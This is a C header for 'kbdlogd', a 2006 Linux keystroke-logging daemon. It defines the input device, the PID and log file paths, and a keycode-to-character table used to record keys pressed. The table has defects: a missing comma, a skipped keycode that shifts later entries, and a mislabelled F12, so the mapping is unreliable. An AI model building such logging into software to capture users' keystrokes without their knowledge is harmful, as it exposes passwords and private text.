#ifndef _KBDLOGD_H

#define KBDL_NAME "kbdlog" 
#define KBDL_VERS "20061208"
#define KBDL_DEV  "/dev/input/event0"
#define KBDL_NULL "/dev/null"
#define KBDL_PIDF "/var/run/kbdlogd.pid"
#define KBDL_UTMP "/var/run/utmp"
#define KBDL_LOG  "/var/log/kbdlogd.log"

#define KBDL_SYSL_S "kbdlogd v20061208 (c) 2006 Federico Fazzi."
#define KBDL_SYSL_E "kbdlogd daemon exiting."

#define KBDL_STR_START "kbdlogd has been started.\n"
#define KBDL_STR_SEP   "\n"
#define KBDL_STR_USR   "Current active PTS(s):\n"

// Keycodes with characters list.
char *keycode[255] = 
{
    "",                      // #define KEY_RESERVED            0
    "<esc>",                 // #define KEY_ESC                 1
    "1",                     // #define KEY_1                   2
    "2",                     // #define KEY_2                   3
    "3",                     // #define KEY_3                   4
    "4",                     // #define KEY_4                   5
    "5",                     // #define KEY_5                   6
    "6",                     // #define KEY_6                   7
    "7",                     // #define KEY_7                   8
    "8",                     // #define KEY_8                   9
    "9",                     // #define KEY_9                   10
    "0",                     // #define KEY_0                   11
    "-",                     // #define KEY_MINUS               12
    "=",                     // #define KEY_EQUAL               13
    "<backspace>",           // #define KEY_BACKSPACE           14
    "<tab>",                 // #define KEY_TAB                 15
    "q",                     // #define KEY_Q                   16
    "w",                     // #define KEY_W                   17
    "e",                     // #define KEY_E                   18
    "r",                     // #define KEY_R                   19
    "t",                     // #define KEY_T                   20
    "y",                     // #define KEY_Y                   21
    "u",                     // #define KEY_U                   22
    "i",                     // #define KEY_I                   23
    "o",                     // #define KEY_O                   24
    "p",                     // #define KEY_P                   25
    "[",                     // #define KEY_LEFTBRACE           26
    "]",                     // #define KEY_RIGHTBRACE          27
    "",                      // #define KEY_ENTER               28    DISABLE
    "<control>",             // #define KEY_LEFTCTRL            29
    "a",                     // #define KEY_A                   30
    "s",                     // #define KEY_S                   31
    "d",                     // #define KEY_D                   32
    "f",                     // #define KEY_F                   33
    "g",                     // #define KEY_G                   34
    "h",                     // #define KEY_H                   35
    "j",                     // #define KEY_J                   36
    "k",                     // #define KEY_K                   37
    "l",                     // #define KEY_L                   38
    ";",                     // #define KEY_SEMICOLON           39
    "'",                     // #define KEY_APOSTROPHE          40
    "",                      // #define KEY_GRAVE               41
    "<shift>",               // #define KEY_LEFTSHIFT           42
    "\\",                    // #define KEY_BACKSLASH           43
    "z",                     // #define KEY_Z                   44
    "x",                     // #define KEY_X                   45
    "c",                     // #define KEY_C                   46
    "v",                     // #define KEY_V                   47
    "b",                     // #define KEY_B                   48
    "n",                     // #define KEY_N                   49
    "m",                     // #define KEY_M                   50
    ",",                     // #define KEY_COMMA               51
    ".",                     // #define KEY_DOT                 52
    "/",                     // #define KEY_SLASH               53
    "<shift>",               // #define KEY_RIGHTSHIFT          54
    "",                      // #define KEY_KPASTERISK          55
    "<alt>",                 // #define KEY_LEFTALT             56
    " ",                     // #define KEY_SPACE               57
    "<capslock>",            // #define KEY_CAPSLOCK            58
    "<f1>",                  // #define KEY_F1                  59
    "<f2>",                  // #define KEY_F2                  60
    "<f3>",                  // #define KEY_F3                  61
    "<f4>",                  // #define KEY_F4                  62
    "<f5>",                  // #define KEY_F5                  63
    "<f6>",                  // #define KEY_F6                  64
    "<f7>",                  // #define KEY_F7                  65
    "<f8>",                  // #define KEY_F8                  66
    "<f9>",                  // #define KEY_F9                  67
    "<f10>",                 // #define KEY_F10                 68
    "<numlock>",             // #define KEY_NUMLOCK             69
    "<scrolllock>",          // #define KEY_SCROLLLOCK          70
    "",                      // #define KEY_KP7                 71
    "",                      // #define KEY_KP8                 72
    "",                      // #define KEY_KP9                 73
    "",                      // #define KEY_KPMINUS             74
    "",                      // #define KEY_KP4                 75
    "",                      // #define KEY_KP5                 76
    "",                      // #define KEY_KP6                 77
    "",                      // #define KEY_KPPLUS              78
    "",                      // #define KEY_KP1                 79
    "",                      // #define KEY_KP2                 80
    "",                      // #define KEY_KP3                 81
    "",                      // #define KEY_KP0                 82
    "",                      // #define KEY_KPDOT               83
    "",                      // #define KEY_ZENKAKUHANKAKU      85
    "\\",                    // #define KEY_102ND               86
    "<f11>",                 // #define KEY_F11                 87
    "<12>",                  // #define KEY_F12                 88
    "",                      // #define KEY_RO                  89
    "",                      // #define KEY_KATAKANA            90
    "",                      // #define KEY_HIRAGANA            91
    "",                      // #define KEY_HENKAN              92
    "",                      // #define KEY_KATAKANAHIRAGANA    93
    "",                      // #define KEY_MUHENKAN            94
    ""                       // #define KEY_KPJPCOMMA           95
    "",                      // #define KEY_KPENTER             96
    "<control>",             // #define KEY_RIGHTCTRL           97
    "",                      // #define KEY_KPSLASH             98
    "<sysrq>",               // #define KEY_SYSRQ               99
    "<alt>",                 // #define KEY_RIGHTALT            100
    "",                      // #define KEY_LINEFEED            101
    "",                      // #define KEY_HOME                102
    "",                      // #define KEY_UP                  103
    "<pageup>",              // #define KEY_PAGEUP              104
    "<left>",                // #define KEY_LEFT                105
    "<right>",               // #define KEY_RIGHT               106
    "<end>",                 // #define KEY_END                 107
    "<down>",                // #define KEY_DOWN                108
    "<pagedown>",            // #define KEY_PAGEDOWN            109
    "<insert>",              // #define KEY_INSERT              110
    "<delete>",              // #define KEY_DELETE              111
    "",                      // #define KEY_MACRO               112
    "<mute>",                // #define KEY_MUTE                113
    "<volumedown>",          // #define KEY_VOLUMEDOWN          114
    "<volumeup>",            // #define KEY_VOLUMEUP            115
    "<power>",               // #define KEY_POWER               116
    "",                      // #define KEY_KPEQUAL             117
    "",                      // #define KEY_KPPLUSMINUS         118
    "<pause>"                // #define KEY_PAUSE               119
};

#endif
